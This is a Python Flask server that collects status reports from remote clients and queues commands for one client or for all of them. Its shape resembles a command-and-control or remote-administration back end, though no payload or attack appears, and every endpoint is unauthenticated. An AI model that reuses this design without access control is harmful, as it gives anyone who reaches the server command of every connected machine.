from flask import Flask, request, jsonify
import time

app = Flask(__name__)

clients = {}
command_queue = {}
report_queue = []  

@app.route('/report', methods=['POST'])
def report_status():
    data = request.json
    client_ip = data.get('client_ip')
    status = data.get('status')
    info = data.get('data')
    version = data.get('version')

    if client_ip not in clients:
        report_queue.append({
            "client_ip": client_ip,
            "status": "new_connection",
            "info": {},
            "time": time.time()
        })
    
    clients[client_ip] = {
        "last_seen": time.time(),
        "status": status,
        "info": info,
        "version": version
    }

    report_queue.append({
        "client_ip": client_ip,
        "status": status,
        "info": info,
        "time": time.time()
    })

    return jsonify({"message": "Status received."}), 200

@app.route('/get_reports', methods=['GET'])
def get_reports():
    """Endpoint, z którego serwer.py pobiera raporty i czyści kolejkę."""
    global report_queue
    reports = report_queue.copy()
    report_queue.clear()
    return jsonify(reports), 200

@app.route('/command/<client_ip>', methods=['GET'])
def get_command(client_ip):
    # This endpoint now returns a JSON object instead of a simple string
    command = command_queue.pop(client_ip, None)
    return jsonify({"command": command}), 200

@app.route('/send_command', methods=['POST'])
def send_command_to_queue():
    data = request.json
    client_ip = data.get('client_ip')
    command = data.get('command')
    # The command is now a dict, not a string
    command_queue[client_ip] = command
    return jsonify({"message": "Command queued."}), 200

@app.route('/send_command_to_all', methods=['POST'])
def send_command_to_all():
    data = request.json
    command = data.get('command')
    for client_ip in clients:
        command_queue[client_ip] = command
    return jsonify({"message": "Command queued for all clients."}), 200

@app.route('/clients', methods=['GET'])
def list_clients():
    return jsonify(clients), 200

@app.route('/clients/<client_ip>', methods=['DELETE'])
def remove_client(client_ip):
    if client_ip in clients:
        del clients[client_ip]
        return jsonify({"message": f"Client {client_ip} removed."}), 200
    return jsonify({"message": f"Client {client_ip} not found."}), 404
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)